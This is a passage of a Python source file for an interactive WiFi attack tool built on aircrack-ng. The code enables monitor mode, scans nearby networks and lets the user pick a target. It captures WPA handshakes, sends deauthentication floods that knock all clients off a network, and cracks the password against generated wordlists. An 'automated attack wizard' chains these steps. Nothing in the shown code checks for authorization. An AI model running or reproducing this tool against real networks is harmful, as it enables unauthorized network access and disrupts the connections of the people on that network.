            self.color_print(f"\n[!] Missing tools: {', '.join(missing_tools)}", 'RED')
            self.color_print("[!] Install with: sudo apt install aircrack-ng", 'YELLOW')
            return False
        
        self.color_print("\n[✓] All dependencies installed", 'GREEN')
        return True
    
    def cleanup(self):
        """Clean up processes and restore network settings"""
        self.color_print("\n[~] Cleaning up...", 'CYAN')
        
        # Kill background processes
        for proc_name, proc in [('cracking', self.cracking_process),
                              ('capture', self.capture_process),
                              ('scan', self.scan_process)]:
            if proc:
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                    self.color_print(f"  [✓] Stopped {proc_name} process", 'GREEN')
                except:
                    pass
        
        # Disable monitor mode if enabled
        if self.monitor_interface:
            self.disable_monitor_mode()
        
        # Restart network manager
        self.restart_network_manager()
        
        self.color_print("[✓] Cleanup complete", 'GREEN')
    
    def list_interfaces(self):
        """List available network interfaces"""
        self.color_print("\n[~] Scanning for wireless interfaces...", 'CYAN')
        
        # Method 1: Using iwconfig
        result = self.run_command("iwconfig 2>/dev/null | grep -E '^[[:alnum:]]+ '", capture_output=True)
        
        interfaces = []
        if result and result.stdout:
            for line in result.stdout.strip().split('\n'):
                if line:
                    iface = line.split()[0]
                    interfaces.append(iface)
        
        # Method 2: Using ip link
        if not interfaces:
            result = self.run_command("ip link show | grep -E '^[0-9]+: [^:]+:' | awk '{print $2}' | tr -d ':'", 
                                    capture_output=True)
            if result and result.stdout:
                interfaces = [iface for iface in result.stdout.strip().split('\n') if iface]
        
        # Filter for wireless interfaces
        wireless_interfaces = []
        for iface in interfaces:
            if iface.startswith('wlan') or iface.startswith('wlx') or iface.startswith('wlp'):
                wireless_interfaces.append(iface)
            else:
                # Check if it's wireless by looking for wireless extensions
                result = self.run_command(f"iwconfig {iface} 2>/dev/null | grep -i 'ieee'", capture_output=True)
                if result and result.stdout:
                    wireless_interfaces.append(iface)
        
        # Display interfaces
        if wireless_interfaces:
            self.print_box("WIRELESS INTERFACES", [], 'GREEN', 70)
            for i, iface in enumerate(wireless_interfaces, 1):
                # Get interface details
                result = self.run_command(f"iwconfig {iface} 2>/dev/null", capture_output=True)
                mode = "Unknown"
                if result and result.stdout:
                    mode_match = re.search(r'Mode:(\w+)', result.stdout)
                    if mode_match:
                        mode = mode_match.group(1)
                
                mode_color = self.COLORS['GREEN'] if mode == "Monitor" else self.COLORS['YELLOW']
                print(f"  {self.COLORS['CYAN']}[{i}]{self.COLORS['ENDC']} {iface:10} - Mode: {mode_color}{mode}{self.COLORS['ENDC']}")
            
            return wireless_interfaces
        else:
            self.color_print("\n[!] No wireless interfaces found!", 'RED')
            self.color_print("[!] Make sure your WiFi adapter is plugged in", 'YELLOW')
            return []
    
    def enable_monitor_mode(self, interface):
        """Enable monitor mode on specified interface"""
        self.color_print(f"\n[~] Enabling monitor mode on {interface}...", 'CYAN')
        
        # Kill interfering processes first
        self.kill_interfering_processes()
        time.sleep(2)
        
        # Stop NetworkManager temporarily
        self.run_command("systemctl stop NetworkManager", capture_output=False)
        time.sleep(1)
        
        # Enable monitor mode
        result = self.run_command(f"airmon-ng start {interface}", capture_output=True)
        
        if result and result.returncode == 0:
            # Try to find the monitor interface
            monitor_iface = None
            
            # Check for common monitor interface names
            for possible in [f"{interface}mon", interface, "mon0", "mon1", "mon2", "mon3"]:
                result = self.run_command(f"iwconfig {possible} 2>/dev/null | grep -i 'mode:monitor'", 
                                        capture_output=True)
                if result and result.stdout:
                    monitor_iface = possible
                    break
            
            if monitor_iface:
                self.monitor_interface = monitor_iface
                self.color_print(f"[✓] Monitor mode enabled on {monitor_iface}", 'GREEN')
                return monitor_iface
            else:
                # Check if original interface is now in monitor mode
                result = self.run_command(f"iwconfig {interface} 2>/dev/null | grep -i 'mode:monitor'",
                                        capture_output=True)
                if result and result.stdout:
                    self.monitor_interface = interface
                    self.color_print(f"[✓] Monitor mode enabled on {interface}", 'GREEN')
                    return interface
                else:
                    self.color_print("[!] Could not verify monitor mode", 'YELLOW')
                    self.monitor_interface = interface
                    return interface
        else:
            self.color_print("[!] Failed to enable monitor mode", 'RED')
            return None
    
    def disable_monitor_mode(self):
        """Disable monitor mode and restore managed mode"""
        if self.monitor_interface:
            self.color_print(f"\n[~] Disabling monitor mode on {self.monitor_interface}...", 'CYAN')
            
            # Stop monitor mode
            result = self.run_command(f"airmon-ng stop {self.monitor_interface}", capture_output=True)
            
            if result and result.returncode == 0:
                # Check if we need to rename interface back
                if self.monitor_interface != self.interface and self.interface:
                    # The interface might have a 'mon' suffix, try to remove it
                    if self.monitor_interface.endswith('mon'):
                        base_iface = self.monitor_interface[:-3]
                        self.run_command(f"ip link set {base_iface} down", capture_output=False)
                        self.run_command(f"iw dev {self.monitor_interface} del", capture_output=False)
                        self.run_command(f"iw phy phy0 interface add {base_iface} type managed", capture_output=False)
                        self.run_command(f"ip link set {base_iface} up", capture_output=False)
                
                self.monitor_interface = None
                self.color_print("[✓] Monitor mode disabled", 'GREEN')
                
                # Restart NetworkManager
                self.restart_network_manager()
                
                return True
            else:
                self.color_print("[!] Failed to disable monitor mode", 'RED')
                return False
        return True
    
    def kill_interfering_processes(self):
        """Kill processes that interfere with monitor mode"""
        self.color_print("[~] Killing interfering processes...", 'CYAN')
        result = self.run_command("airmon-ng check kill", capture_output=True)
        if result and result.returncode == 0:
            self.color_print("[✓] Interfering processes terminated", 'GREEN')
        else:
            self.color_print("[!] Could not kill all interfering processes", 'YELLOW')
    
    def restart_network_manager(self):
        """Restart NetworkManager service"""
        self.color_print("[~] Restarting NetworkManager...", 'CYAN')
        result = self.run_command("systemctl restart NetworkManager", capture_output=True)
        if result and result.returncode == 0:
            self.color_print("[✓] NetworkManager restarted", 'GREEN')
            return True
        else:
            self.color_print("[!] Failed to restart NetworkManager", 'YELLOW')
            return False
    
    def stop_network_manager(self):
        """Stop NetworkManager service"""
        self.color_print("[~] Stopping NetworkManager...", 'CYAN')
        result = self.run_command("systemctl stop NetworkManager", capture_output=True)
        if result and result.returncode == 0:
            self.color_print("[✓] NetworkManager stopped", 'GREEN')
            return True
        else:
            self.color_print("[!] Failed to stop NetworkManager", 'YELLOW')
            return False
    
    def scan_networks_interactive(self, interface, max_time=60):
        """Scan for WiFi networks with interactive control"""
        self.color_print(f"\n[~] Starting network scan on {interface}...", 'CYAN')
        self.color_print("[!] Press Ctrl+C to stop scan and select target", 'YELLOW')
        
        # Create a unique scan file
        scan_file = f"scan_{int(time.time())}"
        
        # Start scan in background
        cmd = f"airodump-ng {interface} --write {scan_file} --output-format csv"
        self.scan_process = self.run_command(cmd, background=True, capture_output=False)
        
        self.scan_active = True
        self.scan_stop_event.clear()
        
        # Display scanning animation
        start_time = time.time()
        animation = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
        idx = 0
        
        print("\n" + "="*70)
        print(f"{self.COLORS['CYAN']}{self.COLORS['BOLD']}SCANNING NETWORKS - Press Ctrl+C to stop{self.COLORS['ENDC']}")
        print("="*70)
        print(f"{self.COLORS['WHITE']}BSSID              CH  ENCRYPTION  PWR  Beacons  ESSID{self.COLORS['ENDC']}")
        print("-"*70)
        
        networks = []
        last_update = 0
        
        try:
            while time.time() - start_time < max_time and not self.scan_stop_event.is_set():
                # Check for new networks in the CSV file
                csv_file = f"{scan_file}-01.csv"
                if Path(csv_file).exists():
                    current_time = time.time()
                    if current_time - last_update > 2:  # Update every 2 seconds
                        last_update = current_time
                        new_networks = self.parse_scan_results(csv_file)
                        if new_networks:
                            networks = new_networks
                            self.display_networks_table(networks[:15])  # Show top 15
                
                # Display animation
                print(f"\r{self.COLORS['CYAN']}{animation[idx % len(animation)]}{self.COLORS['ENDC']} Scanning... {int(time.time() - start_time)}s ", end='')
                idx += 1
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            self.color_print("\n\n[!] Scan interrupted by user", 'YELLOW')
            self.scan_stop_event.set()
        
        finally:
            self.scan_active = False
            
            # Stop the scan process
            if self.scan_process:
                try:
                    os.killpg(os.getpgid(self.scan_process.pid), signal.SIGTERM)
                    self.scan_process.wait(timeout=5)
                    self.scan_process = None
                except:
                    pass
            
            # Clean up scan files
            for f in Path('.').glob(f"{scan_file}*"):
                try:
                    f.unlink()
                except:
                    pass
        
        print("\n" + "="*70)
        return networks[:20]  # Return top 20 networks
    
    def parse_scan_results(self, csv_file):
        """Parse airodump-ng CSV results"""
        networks = []
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            # Find where network data starts (skip headers)
            start_idx = 0
            for i, line in enumerate(lines):
                if line.startswith('Station MAC'):
                    start_idx = i
                    break
            
            # Parse networks
            for line in lines[:start_idx]:
                if line.strip() and ',' in line and 'BSSID' not in line:
                    parts = line.strip().split(',')
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        if bssid and len(bssid) == 17:  # Valid MAC address
                            first_seen = parts[1].strip()
                            last_seen = parts[2].strip()
                            channel = parts[3].strip()
                            speed = parts[4].strip()
                            privacy = parts[5].strip()
                            cipher = parts[6].strip()
                            auth = parts[7].strip()
                            power = parts[8].strip()
                            beacons = parts[9].strip()
                            iv = parts[10].strip()
                            lan_ip = parts[11].strip()
                            id_len = parts[12].strip()
                            ssid = parts[13].strip() if len(parts) > 13 else "Hidden"
                            
                            # Clean up SSID (remove non-printable characters)
                            ssid = ''.join(char for char in ssid if char.isprintable())
                            if not ssid or ssid.isspace():
                                ssid = "Hidden"
                            
                            manufacturer = self.get_manufacturer(bssid)
                            
                            networks.append({
                                'bssid': bssid,
                                'ssid': ssid,
                                'channel': channel,
                                'encryption': privacy,
                                'power': power,
                                'beacons': beacons,
                                'manufacturer': manufacturer
                            })
        
        except Exception as e:
            self.color_print(f"[!] Error parsing scan results: {e}", 'RED')
        
        return networks
    
    def display_networks_table(self, networks):
        """Display networks in a formatted table"""
        # Clear previous table lines (approx 20 lines)
        print("\033[20A", end='')  # Move cursor up 20 lines
        
        print(f"{self.COLORS['WHITE']}BSSID              CH  ENCRYPTION  PWR  Beacons  ESSID{self.COLORS['ENDC']}")
        print("-"*70)
        
        for i, net in enumerate(networks[:15], 1):
            # Truncate long SSIDs
            ssid_display = net['ssid'][:25] + "..." if len(net['ssid']) > 28 else net['ssid']
            
            # Color code encryption
            if "WPA2" in net['encryption']:
                enc_color = self.COLORS['RED']
                enc_icon = "🔒"
            elif "WPA" in net['encryption']:
                enc_color = self.COLORS['YELLOW']
                enc_icon = "🔐"
            elif "WEP" in net['encryption']:
                enc_color = self.COLORS['MAGENTA']
                enc_icon = "🔓"
            elif "OPN" in net['encryption']:
                enc_color = self.COLORS['GREEN']
                enc_icon = "🌐"
            else:
                enc_color = self.COLORS['WHITE']
                enc_icon = "❓"
            
            # Color code signal power
            try:
                power = int(net['power'])
                if power >= -50:
                    pwr_color = self.COLORS['GREEN']
                elif power >= -70:
                    pwr_color = self.COLORS['YELLOW']
                else:
                    pwr_color = self.COLORS['RED']
            except:
                pwr_color = self.COLORS['WHITE']
                power = net['power']
            
            print(f"{self.COLORS['CYAN']}{i:2}. {net['bssid']}{self.COLORS['ENDC']} "
                  f"{net['channel']:>3}  {enc_color}{enc_icon} {net['encryption'][:8]:8}{self.COLORS['ENDC']} "
                  f"{pwr_color}{power:>4}{self.COLORS['ENDC']}  {net['beacons']:>7}  {ssid_display}")
    
    def capture_handshake(self, interface, bssid, channel, output_file=None):
        """Capture WPA handshake"""
        if not output_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            ssid_short = ''.join(c for c in bssid if c.isalnum())[:8]
            output_file = f"{self.capture_dir}/handshake_{ssid_short}_{timestamp}"
        
        self.print_box("HANDSHAKE CAPTURE", [
            f"Target: {bssid}",
            f"Channel: {channel}",
            f"Interface: {interface}",
            f"Output: {output_file}",
            "",
            "Press Ctrl+C when handshake is captured or to stop"
        ], 'CYAN', 70)
        
        # Start capture
        cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {output_file} {interface}"
        self.capture_process = self.run_command(cmd, background=True, capture_output=False)
        
        return output_file, self.capture_process
    
    def deauth_attack(self, interface, bssid, client=None, count=10):
        """Perform deauthentication attack"""
        self.color_print(f"\n[~] Sending deauthentication packets...", 'CYAN')
        
        if client:
            cmd = f"aireplay-ng -0 {count} -a {bssid} -c {client} {interface}"
            self.color_print(f"Targeting client: {client}", 'YELLOW')
        else:
            cmd = f"aireplay-ng -0 {count} -a {bssid} {interface}"
            self.color_print("Targeting all clients on network", 'YELLOW')
        
        result = self.run_command(cmd, capture_output=True)
        
        if result and result.returncode == 0:
            self.color_print("[✓] Deauthentication packets sent", 'GREEN')
            return True
        else:
            self.color_print("[!] Deauthentication failed", 'RED')
            return False
    
    def check_handshake(self, cap_file):
        """Check if capture file contains a valid handshake"""
        self.color_print(f"\n[~] Checking for valid handshake...", 'CYAN')
        
        cap_path = f"{cap_file}.cap" if not cap_file.endswith('.cap') else cap_file
        
        if not Path(cap_path).exists():
            self.color_print(f"[!] Capture file not found: {cap_path}", 'RED')
            return False
        
        # Use pyrit for better handshake detection if available
        pyrit_result = self.run_command(f"pyrit -r {cap_path} analyze 2>/dev/null | grep -i 'good'", 
                                      capture_output=True)
        
        if pyrit_result and pyrit_result.stdout and 'good' in pyrit_result.stdout.lower():
            self.color_print("[✓] Valid handshake found (pyrit verified)!", 'GREEN', True)
            self.play_notification()
            return True
        
        # Fallback to aircrack-ng
        cmd = f"aircrack-ng {cap_path} 2>/dev/null | grep -i 'handshake'"
        result = self.run_command(cmd, capture_output=True)
        
        if result and result.stdout and 'handshake' in result.stdout.lower():
            self.color_print("[✓] Valid handshake found!", 'GREEN', True)
            self.play_notification()
            return True
        else:
            self.color_print("[!] No valid handshake found", 'RED')
            return False
    
    def play_notification(self):
        """Play notification sound"""
        try:
            # Try different notification methods
            subprocess.run(["paplay", "/usr/share/sounds/freedesktop/stereo/complete.oga"], 
                         capture_output=True, timeout=2)
        except:
            try:
                # Beep as fallback
                print("\a", end='', flush=True)
            except:
                pass
    
    def crack_password(self, cap_file, wordlist=None):
        """Crack password using aircrack-ng"""
        if not wordlist:
            if self.wordlist and Path(self.wordlist).exists():
                wordlist = self.wordlist
            else:
                self.color_print("[!] No wordlist specified", 'RED')
                return False
        
        if not Path(wordlist).exists():
            self.color_print(f"[!] Wordlist not found: {wordlist}", 'RED')
            return False
        
        cap_path = f"{cap_file}.cap" if not cap_file.endswith('.cap') else cap_file
        
        if not Path(cap_path).exists():
            self.color_print(f"[!] Capture file not found: {cap_path}", 'RED')
            return False
        
        self.print_box("PASSWORD CRACKING", [
            f"Capture: {os.path.basename(cap_path)}",
            f"Wordlist: {os.path.basename(wordlist)}",
            "",
            "Press Ctrl+C to stop cracking"
        ], 'MAGENTA', 70)
        
        cmd = f"aircrack-ng -w {wordlist} {cap_path}"
        self.cracking_process = self.run_command(cmd, background=False, capture_output=False)
        
        return True
    
    def wordlist_generator(self, keywords, output_file="custom_wordlist.txt"):
        """Generate custom wordlist based on keywords"""
        self.color_print(f"\n[~] Generating wordlist from keywords...", 'CYAN')
        
        wordlist = set()
        
        # Common password patterns
        patterns = [
            "{keyword}", "{keyword}123", "{keyword}1234", "{keyword}12345",
            "{keyword}123456", "{keyword}!@#", "{keyword}!", "{keyword}@",
            "{keyword}#", "{keyword}$", "{keyword}%", "{keyword}^",
            "{keyword}&", "{keyword}*", "{keyword}()", "{keyword}_",
            "{keyword}-", "{keyword}+", "{keyword}=", "{keyword}~",
            "{keyword}`", "{keyword}2023", "{keyword}2024", "{keyword}2025",
            "{keyword}2026", "{keyword}2027", "{keyword}2028", "{keyword}2029",
            "{keyword}2030", "{keyword}1!", "{keyword}12!", "{keyword}123!",
            "{keyword}1234!", "{keyword}12345!", "{keyword}123456!",
            "{keyword}admin", "{keyword}pass", "{keyword}password",
            "{keyword}pass123", "{keyword}pass1234", "{keyword}pass12345",
            "123{keyword}", "1234{keyword}", "12345{keyword}", "123456{keyword}",
            "{keyword}1", "{keyword}12", "{keyword}123", "{keyword}1234",
            "{keyword}_2023", "{keyword}_2024", "{keyword}_2025",
            "{keyword}_2026", "{keyword}_2027", "{keyword}_2028",
            "{keyword}_2029", "{keyword}_2030", "{keyword}@2023",
            "{keyword}@2024", "{keyword}@2025", "{keyword}@2026",
            "{keyword}@2027", "{keyword}@2028", "{keyword}@2029",
            "{keyword}@2030", "{keyword}.2023", "{keyword}.2024",
            "{keyword}.2025", "{keyword}.2026", "{keyword}.2027",
            "{keyword}.2028", "{keyword}.2029", "{keyword}.2030",
            "{keyword}-2023", "{keyword}-2024", "{keyword}-2025",
            "{keyword}-2026", "{keyword}-2027", "{keyword}-2028",
            "{keyword}-2029", "{keyword}-2030",
        ]
        
        # Leetspeak substitutions
        leet_subs = {
            'a': ['4', '@'],
            'e': ['3'],
            'i': ['1', '!'],
            'o': ['0'],
            's': ['5', '$'],
            't': ['7'],
        }
        
        for keyword in keywords:
            keyword = keyword.strip()
            if not keyword:
                continue
            
            # Generate variations
            variations = [
                keyword,
                keyword.capitalize(),
                keyword.upper(),
                keyword.lower(),
            ]
            
            # Add leetspeak variations
            for i in range(min(3, len(keyword))):  # Limit leetspeak depth
                leet_keyword = keyword
                for orig, subs in leet_subs.items():
                    for sub in subs:
                        if orig in leet_keyword.lower():
                            leet_keyword = leet_keyword.replace(orig, sub)
                            leet_keyword = leet_keyword.replace(orig.upper(), sub)
                variations.append(leet_keyword)
            
            # Apply patterns to all variations
            for var in set(variations):
                for pattern in patterns:
                    wordlist.add(pattern.format(keyword=var))
        
        # Add common passwords
        common_passwords = [
            "password", "123456", "12345678", "1234", "qwerty", "admin",
            "welcome", "monkey", "password1", "123123", "letmein", "dragon",
            "baseball", "sunshine", "iloveyou", "princess", "football",
            "superman", "michael", "jennifer", "hunter", "trustno1",
            "mustang", "master", "hello", "charlie", "donald", "harley",
            "freedom", "whatever", "hello", "secret", "qazwsx", "123qwe",
            "1q2w3e4r", "1qaz2wsx", "zaq12wsx", "qwerty123", "asdfgh",
            "zxcvbn", "asdfghjkl", "qwertyuiop", "password123", "admin123",
            "welcome123", "letmein123", "1234567890", "000000", "111111",
            "222222", "333333", "444444", "555555", "666666", "777777",
            "888888", "999999", "123456789", "987654321", "abcdef",
            "abc123", "aaa111", "administrator", "root", "toor", "mysql",
            "oracle", "cisco", "default", "system", "manager", "network",
            "security", "access", "control", "server", "database", "web",
            "internet", "wireless", "router", "modem", "gateway", "switch",
            "hub", "firewall", "proxy", "vpn", "wan", "lan", "wlan",
            "bluetooth", "ethernet", "token", "certificate", "encryption",
            "authentication", "authorization", "validation", "verification",
        ]
        
        wordlist.update(common_passwords)
        
        # Write to file
        output_path = f"{self.wordlist_dir}/{output_file}"
        with open(output_path, 'w') as f:
            for word in sorted(wordlist):
                f.write(f"{word}\n")
        
        self.color_print(f"[✓] Wordlist generated: {output_path} ({len(wordlist)} words)", 'GREEN')
        return output_path
    
    def handshake_manager(self):
        """Manage captured handshake files"""
        cap_files = list(Path(self.capture_dir).glob("*.cap"))
        
        if not cap_files:
            self.color_print("\n[!] No captured files found", 'YELLOW')
            return
        
        self.print_box("HANDSHAKE MANAGER", [
            f"Found {len(cap_files)} capture files"
        ], 'GREEN', 70)
        
        for i, cap_file in enumerate(cap_files, 1):
            size_kb = cap_file.stat().st_size / 1024
            size_mb = size_kb / 1024
            if size_mb >= 1:
                size_str = f"{size_mb:.1f} MB"
            else:
                size_str = f"{size_kb:.0f} KB"
            
            mtime = datetime.fromtimestamp(cap_file.stat().st_mtime)
            time_str = mtime.strftime("%Y-%m-%d %H:%M")
            
            print(f"  {self.COLORS['CYAN']}[{i}]{self.COLORS['ENDC']} {cap_file.name:40} {size_str:>8} - {time_str}")
        
        try:
            choice = int(input(f"\n{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} Select file (0 to go back): "))
            if choice == 0:
                return
            
            if 1 <= choice <= len(cap_files):
                selected = cap_files[choice-1]
                
                self.print_box("FILE ACTIONS", [
                    f"Selected: {selected.name}",
                    "",
                    "Choose an action:"
                ], 'CYAN', 70)
                
                print(f"  {self.COLORS['CYAN']}[1]{self.COLORS['ENDC']} Check for handshake")
                print(f"  {self.COLORS['CYAN']}[2]{self.COLORS['ENDC']} Crack password")
                print(f"  {self.COLORS['CYAN']}[3]{self.COLORS['ENDC']} Delete file")
                print(f"  {self.COLORS['CYAN']}[4]{self.COLORS['ENDC']} Rename file")
                print(f"  {self.COLORS['CYAN']}[5]{self.COLORS['ENDC']} Show file info")
                print(f"  {self.COLORS['RED']}[0]{self.COLORS['ENDC']} Back")
                
                action = int(input(f"\n{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} Select action: "))
                
                if action == 1:
                    self.check_handshake(str(selected)[:-4])  # Remove .cap extension
                elif action == 2:
                    wordlist = input(f"{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} Wordlist path (Enter for default): ")
                    if not wordlist:
                        wordlist = self.wordlist
                    self.crack_password(str(selected), wordlist)
                elif action == 3:
                    confirm = input(f"{self.COLORS['RED']}[!]{self.COLORS['ENDC']} Delete {selected.name}? (y/n): ")
                    if confirm.lower() == 'y':
                        selected.unlink()
                        self.color_print("[✓] File deleted", 'GREEN')
                elif action == 4:
                    new_name = input(f"{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} New name (without .cap): ")
                    if new_name:
                        new_path = Path(self.capture_dir) / f"{new_name}.cap"
                        selected.rename(new_path)
                        self.color_print("[✓] File renamed", 'GREEN')
                elif action == 5:
                    self.show_file_info(selected)
        except (ValueError, IndexError):
            self.color_print("[!] Invalid selection", 'RED')
    
    def show_file_info(self, cap_file):
        """Show detailed information about capture file"""
        self.color_print(f"\n[~] Analyzing {cap_file.name}...", 'CYAN')
        
        # Get file size
        size_kb = cap_file.stat().st_size / 1024
        size_mb = size_kb / 1024
        
        # Get capture time
        mtime = datetime.fromtimestamp(cap_file.stat().st_mtime)
        
        # Try to get info from file
        cmd = f"capinfos {cap_file} 2>/dev/null | grep -E 'File type|Number of packets|Data size'"
        result = self.run_command(cmd, capture_output=True)
        
        info_lines = [
            f"Filename: {cap_file.name}",
            f"Size: {size_mb:.2f} MB ({size_kb:.0f} KB)",
            f"Modified: {mtime.strftime('%Y-%m-%d %H:%M:%S')}",
        ]
        
        if result and result.stdout:
            for line in result.stdout.strip().split('\n'):
                if ':' in line:
                    key, value = line.split(':', 1)
                    info_lines.append(f"{key.strip()}: {value.strip()}")
        
        self.print_box("FILE INFORMATION", info_lines, 'BLUE', 70)
    
    def update_dependencies(self):
        """Update system and aircrack-ng suite"""
        self.print_box("UPDATE & CLEANUP", [
            "This will update system packages and aircrack-ng",
            "It will also kill interfering processes",
            "",
            "Choose action:"
        ], 'YELLOW', 70)
        
        print(f"  {self.COLORS['CYAN']}[1]{self.COLORS['ENDC']} Update packages only")
        print(f"  {self.COLORS['CYAN']}[2]{self.COLORS['ENDC']} Kill interfering processes")
        print(f"  {self.COLORS['CYAN']}[3]{self.COLORS['ENDC']} Restart NetworkManager")
        print(f"  {self.COLORS['CYAN']}[4]{self.COLORS['ENDC']} Full cleanup (recommended)")
        print(f"  {self.COLORS['RED']}[0]{self.COLORS['ENDC']} Back")
        
        try:
            choice = int(input(f"\n{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} Select action: "))
            
            if choice == 1:
                self.color_print("\n[~] Updating package list...", 'CYAN')
                result = self.run_command("apt-get update", capture_output=True)
                if result and result.returncode == 0:
                    self.color_print("[✓] Package list updated", 'GREEN')
                else:
                    self.color_print("[!] Failed to update packages", 'RED')
            
            elif choice == 2:
                self.kill_interfering_processes()
            
            elif choice == 3:
                self.restart_network_manager()
            
            elif choice == 4:
                self.color_print("\n[~] Performing full cleanup...", 'CYAN')
                # Update packages
                result = self.run_command("apt-get update && apt-get upgrade aircrack-ng -y", 
                                        capture_output=True)
                if result and result.returncode == 0:
                    self.color_print("[✓] Packages updated", 'GREEN')
                
                # Kill processes
                self.kill_interfering_processes()
                
                # Restart NetworkManager
                self.restart_network_manager()
                
                # Clean up temporary files
                self.color_print("[~] Cleaning temporary files...", 'CYAN')
                self.run_command("rm -f scan_* *.csv *.netxml 2>/dev/null", capture_output=False)
                self.color_print("[✓] Cleanup complete", 'GREEN')
            
            elif choice == 0:
                return
            
            else:
                self.color_print("[!] Invalid selection", 'RED')
                
        except ValueError:
            self.color_print("[!] Invalid input", 'RED')
    
    def network_manager_control(self):
        """Control NetworkManager service"""
        self.print_box("NETWORK MANAGER CONTROL", [
            "Control NetworkManager service state",
            "",
            "Current status:"
        ], 'BLUE', 70)
        
        # Check current status
        status_result = self.run_command("systemctl is-active NetworkManager", capture_output=True)
        if status_result and "active" in status_result.stdout:
            self.color_print("  Status: ACTIVE", 'GREEN')
            print(f"  {self.COLORS['CYAN']}[1]{self.COLORS['ENDC']} Stop NetworkManager")
            print(f"  {self.COLORS['CYAN']}[2]{self.COLORS['ENDC']} Restart NetworkManager")
        else:
            self.color_print("  Status: INACTIVE", 'RED')
            print(f"  {self.COLORS['CYAN']}[1]{self.COLORS['ENDC']} Start NetworkManager")
        
        print(f"  {self.COLORS['RED']}[0]{self.COLORS['ENDC']} Back")
        
        try:
            choice = int(input(f"\n{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} Select action: "))
            
            if choice == 1:
                if status_result and "active" in status_result.stdout:
                    self.run_command("systemctl stop NetworkManager", capture_output=False)
                    self.color_print("[✓] NetworkManager stopped", 'GREEN')
                else:
                    self.run_command("systemctl start NetworkManager", capture_output=False)
                    self.color_print("[✓] NetworkManager started", 'GREEN')
            
            elif choice == 2:
                self.restart_network_manager()
            
            elif choice == 0:
                return
            
            else:
                self.color_print("[!] Invalid selection", 'RED')
                
        except ValueError:
            self.color_print("[!] Invalid input", 'RED')
    
    def automated_attack(self):
        """Automated step-by-step attack wizard"""
        self.print_header()
        self.print_box("AUTOMATED ATTACK WIZARD", [
            "This wizard will guide you through the complete attack process",
            "Follow the steps and press Ctrl+C at any time to cancel",
            "",
            "Step 1: Select wireless interface"
        ], 'MAGENTA', 70)
        
        # Step 1: Select interface
        interfaces = self.list_interfaces()
        if not interfaces:
            input(f"\n{self.COLORS['YELLOW']}[!]{self.COLORS['ENDC']} Press Enter to continue...")
            return
        
        try:
            choice = int(input(f"\n{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} Select interface [1-{len(interfaces)}]: "))
            if 1 <= choice <= len(interfaces):
                self.interface = interfaces[choice-1]
                self.save_config()
            else:
                self.color_print("[!] Invalid selection", 'RED')
                return
        except ValueError:
            self.color_print("[!] Invalid input", 'RED')
            return
        
        # Step 2: Enable monitor mode
        self.print_box("STEP 2: MONITOR MODE", [
            f"Selected interface: {self.interface}",
            "Enabling monitor mode...",
            "This may take a few seconds"
        ], 'CYAN', 70)
        
        self.monitor_interface = self.enable_monitor_mode(self.interface)
        if not self.monitor_interface:
            input(f"\n{self.COLORS['YELLOW']}[!]{self.COLORS['ENDC']} Press Enter to continue...")
            return
        
        # Step 3: Scan networks
        self.print_box("STEP 3: NETWORK SCAN", [
            f"Monitor interface: {self.monitor_interface}",
            "Scanning for available networks...",
            "Press Ctrl+C to stop scan and select target"
        ], 'CYAN', 70)
        
        networks = self.scan_networks_interactive(self.monitor_interface, max_time=30)
        
        if not networks:
            self.color_print("\n[!] No networks found", 'RED')
            self.disable_monitor_mode()
            input(f"\n{self.COLORS['YELLOW']}[!]{self.COLORS['ENDC']} Press Enter to continue...")
            return
        
        # Display networks for selection
        self.print_box("SELECT TARGET NETWORK", [
            f"Found {len(networks)} networks",
            "Select a target:"
        ], 'GREEN', 70)
        
        for i, net in enumerate(networks[:15], 1):
            ssid_display = net['ssid'][:30] + "..." if len(net['ssid']) > 33 else net['ssid']
            enc_icon = "🔒" if "WPA" in net['encryption'] else "⚠️"
            print(f"  {self.COLORS['CYAN']}[{i}]{self.COLORS['ENDC']} {enc_icon} {ssid_display:33} | {net['bssid']}")
            print(f"      Channel: {net['channel']:2} | Power: {net['power']:4} | Manufacturer: {net['manufacturer']}")
            if i < len(networks[:15]):
                print()
        
        try:
            choice = int(input(f"\n{self.COLORS['YELLOW']}[?]{self.COLORS['ENDC']} Select target [1-{min(15, len(networks))}]: "))
            if 1 <= choice <= min(15, len(networks)):
                target = networks[choice-1]
                self.bssid = target['bssid']
                self.channel = target['channel']
                
                self.print_box("TARGET SELECTED", [
                    f"SSID: {target['ssid']}",
                    f"BSSID: {self.bssid}",
                    f"Channel: {self.channel}",
                    f"Encryption: {target['encryption']}",
                    f"Manufacturer: {target['manufacturer']}"
                ], 'GREEN', 70)
            else:
                self.color_print("[!] Invalid selection", 'RED')
                self.disable_monitor_mode()
                return
        except ValueError:
            self.color_print("[!] Invalid input", 'RED')
            self.disable_monitor_mode()
            return
        
        # Step 4: Capture handshake
        self.print_box("STEP 4: HANDSHAKE CAPTURE", [
            "Starting handshake capture...",
            "We will now attempt to capture the WPA handshake",
            "This involves deauthenticating clients and capturing the reconnection",
            "",
            "Press Ctrl+C when handshake is captured or to stop"
        ], 'MAGENTA', 70)
        
        cap_file, cap_process = self.capture_handshake(
            self.monitor_interface, 
            self.bssid, 
            self.channel
        )
        
        # Step 5: Perform deauth attack
        time.sleep(3)
        
        self.color_print("\n[~] Attempting to capture handshake...", 'CYAN')
        
        # Try deauth multiple times
        handshake_captured = False
        for attempt in range(8):
            self.color_print(f"\n[~] Deauth attempt {attempt+1}/8", 'CYAN')
            
            if self.deauth_attack(self.monitor_interface, self.bssid, count=8):
                # Wait and check for handshake
                time.sleep(6)
                
                if self.check_handshake(cap_file):
                    handshake_captured = True
                    self.cap_file = f"{cap_file}.cap"
                    break
                
                # Show progress
